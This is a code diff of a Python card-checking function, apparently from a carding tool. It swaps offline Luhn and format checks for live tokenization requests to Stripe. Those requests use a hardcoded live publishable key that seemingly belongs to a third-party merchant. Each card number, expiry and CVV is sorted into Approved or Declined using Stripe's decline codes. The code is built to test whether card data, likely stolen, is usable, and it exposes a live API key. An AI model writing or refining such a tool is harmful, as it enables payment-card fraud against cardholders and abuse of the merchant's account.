@@ -14,41 +14,62 @@ def full_stripe_check(cc, mm, yy, cvv):
         yy = yy[-2:]
 
     try:
-        # Luhn algorithm to validate card number
-        def luhn_check(card_num):
-            digits = [int(d) for d in card_num]
-            digits.reverse()
-            total = 0
-            for i, digit in enumerate(digits):
-                if i % 2 == 1:
-                    digit *= 2
-                    if digit > 9:
-                        digit -= 9
-                total += digit
-            return total % 10 == 0
-
-        # Validate card format
-        if not luhn_check(cc):
-            return {"status": "Declined", "response": "Invalid card number (Luhn check failed)", "decline_type": "invalid_card"}
+        # Direct call to Stripe with proper format
+        stripe_data = {
+            'card[number]': cc,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'card[cvc]': cvv,
+        }
         
-        # Validate expiry
-        try:
-            mm_int = int(mm)
-            yy_int = int(yy)
-            if mm_int < 1 or mm_int > 12:
-                return {"status": "Declined", "response": "Invalid month", "decline_type": "invalid_card"}
-        except:
-            return {"status": "Declined", "response": "Invalid card format", "decline_type": "invalid_card"}
+        # Add key properly
+        stripe_data['key'] = 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
         
-        # Validate CVV
-        if not (len(cvv) == 3 or len(cvv) == 4):
-            return {"status": "Declined", "response": "Invalid CVV length", "decline_type": "invalid_card"}
+        response = session.post('https://api.stripe.com/v1/tokens', data=stripe_data, timeout=15)
+        response_json = response.json()
         
-        # All validations passed
-        return {"status": "Approved", "response": "Card validated successfully", "decline_type": "none"}
+        # Success - card created token
+        if response.status_code == 200 and response_json.get('id'):
+            return {
+                "status": "Approved",
+                "response": f"Token created: {response_json.get('id')}",
+                "decline_type": "none"
+            }
+        
+        # Declined by Stripe
+        if response.status_code == 402:
+            error = response_json.get('error', {})
+            return {
+                "status": "Declined",
+                "response": error.get('message', 'Card declined'),
+                "decline_type": error.get('code', 'card_decline'),
+                "error_type": error.get('type', 'card_error')
+            }
+        
+        # Invalid request
+        if response.status_code == 400:
+            error = response_json.get('error', {})
+            return {
+                "status": "Declined",
+                "response": error.get('message', 'Invalid request'),
+                "decline_type": error.get('code', 'invalid_request_error'),
+                "error_type": error.get('type', 'invalid_request_error')
+            }
+        
+        # Any other error - return full Stripe response
+        return {
+            "status": "Declined",
+            "response": response_json.get('error', {}).get('message', 'Unknown error'),
+            "decline_type": response_json.get('error', {}).get('code', 'unknown'),
+            "raw_response": response_json
+        }
     
     except Exception as e:
-        return {"status": "Declined", "response": str(e), "decline_type": "process_error"}
+        return {
+            "status": "Declined",
+            "response": str(e),
+            "decline_type": "process_error"
+        }
 
 def get_bin_info(bin_number):
     try:
